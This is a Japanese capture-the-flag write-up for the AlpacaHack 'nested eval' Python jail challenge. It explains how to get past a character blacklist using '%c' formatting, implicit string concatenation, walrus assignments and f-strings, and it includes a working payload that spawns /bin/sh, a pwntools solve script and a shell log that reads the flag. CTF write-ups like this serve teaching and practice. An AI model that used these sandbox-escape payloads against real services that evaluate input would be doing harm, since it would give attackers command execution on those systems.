# ■ nested eval
[nested eval - AlpacaHack](https://alpacahack.com/daily/challenges/nested-eval)

## 1. Writeup

`chal.py`:
```python
1	code = input("jail> ")
2	assert code.isascii(), "Not allowed"
3	
4	prohibited = ["(", ")", "\\", "+", "__"]
5	assert not any(p in code for p in prohibited), "Not allowed"
6	
7	eval(f"eval({code})")
```

入力 `code` に対して,

- ASCIIのみ
- `(`, `)`, `\`, `+`, `__` を含まない

という制約がある. さらに, `code` は二重evalで実行される.

### 1.1. 二重eval
`eval(f"eval({code})")` の処理は以下を意味する.

1. 文字列 `code`  が f-string に埋め込まれ, 新たな文字列 `"eval(" + code + ")"` が組み立てられる.
2. 外側の `eval` がこの新たな文字列をpythonソースコードとして実行.

試しに単純な値を入れると構造が明確になる.:

```bash
jail> 1
Traceback (most recent call last):
  File "/nested-eval/chal.py", line 7, in <module>
    eval(f"eval({code})")
    ~~~~^^^^^^^^^^^^^^^^^
  File "<string>", line 1, in <module>
TypeError: eval() arg 1 must be a string, bytes or code object
```

`eval(eval(1))` を実行しようとするが, `eval` の引数は文字列である必要があるのでエラーとなる.

```bash
jail> '1'

$ echo $?
0
```

`code` = `'1'` とすると `eval(eval('1'))` → `eval(1)` が実行される.

したがって, `eval(code)` の評価結果が文字列となるような, 制約を通過する `code` を指定すれば良い.

**最終的に `__import__("os").system("/bin/sh")` を評価させることを目標とする.**
### 1.2. 変換指定子 `%c` フォーマット
`char(40)` などの代わりに, 演算子 `%` の 変換指定子`%c` をつかう.

```python
"%c" % 40   # -> '('
"%c" % 41   # -> ')'
```

### 1.3. 隣接文字列リテラル結合
Pythonにはソースコード中で隣接する文字列リテラル同士が暗黙に連結される. これを使用して 部分文字列 `__` の使用を回避できる.

```python
"_" "_import_" "_"
```

```bash
>>> eval("_""_import_""_")
<built-in function __import__>
```

### 1.4. 文字列の組み立て
文字列連結を以下の手段を組み合わせて実現させる.:

- walrus演算子 `:=`: 括弧文字を変数に保存して再利用.
- f-string `{}`: `{}` 内に変数や式を置いて文字列連結.
- リスト `[]`, カンマ: 1つの式にまとめる

```python
l := '%c' % 40   # '('
r := '%c' % 41   # ')'
```

```python
f'{"_""_import_""_"}{l}"os"{r}.system{l}"/bin/sh"{r}'
```

### 1.5. ペイロード
以上を踏まえてペイロードを作成する.

e.g.
```python
[l:='%c'%40,r:='%c'%41,f'{"_""_import_""_"}{l}"os"{r}.system{l}"/bin/sh"{r}'][-1]
```

`solve.py`:
```python
 1	from pwn import *
 2	
 3	context(os='linux', arch='amd64')
 4	
 5	HOST = "localhost"
 6	PORT = 1337
 7	
 8	io = remote(HOST, PORT)
 9	
10	def exploit():
11		payload = b'''[l:='%c'%40,r:='%c'%41,f'{"_""_import_""_"}{l}"os"{r}.system{l}"/bin/sh"{r}'][-1]'''
12		io.sendlineafter(b"jail>", payload)
13		io.interactive()
14	
15	if __name__ == "__main__":
16		exploit()
```

`Dockerfile` をみると, `flag.txt` は `/flag-<md5sum>.txt` として保存されているので, 確認しにいく.

`Dockerfile#L11`:
```Dockerfile
11	RUN mv flag.txt /flag-$(md5sum flag.txt | awk '{print $1}').txt
```

```bash
$ python solve.py
[+] Opening connection to localhost on port 1337: Done
[*] Switching to interactive mode
$ pwd
/app
$ cd /
$ ls *.txt
flag-f3cf50791216b1edc560a2d0f4053949.txt
$ cat $(ls *.txt)
Alpaca{REDACTED}
```